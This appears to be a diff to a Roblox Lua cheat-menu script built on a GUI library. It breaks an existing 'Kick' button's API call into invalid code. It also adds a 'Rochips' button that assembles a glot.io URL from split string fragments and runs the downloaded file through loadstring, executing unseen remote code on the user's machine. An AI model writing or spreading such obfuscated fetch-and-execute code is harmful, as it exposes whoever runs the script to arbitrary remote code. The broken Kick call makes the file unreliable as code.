@@ -7,5 +7,15 @@ local Main = Window:NewTab("Local")
 local MainSection = Main:NewSection("Main")
 
 MainSection:NewButton("Kick", "Kicky", function()
-    game.Players.LocalPlayer:Kick("Leaving the game.") 
+    game.player.Localplayer:kick("Lol")
 end)
+
+MainSection:NewButton("Rochips", "Activates rochips", function()
+    if "Rochips Loader" then
+        local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
+        Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
+        return "it will load in around 3 - 131 seconds"
+    end
+end)
+
+
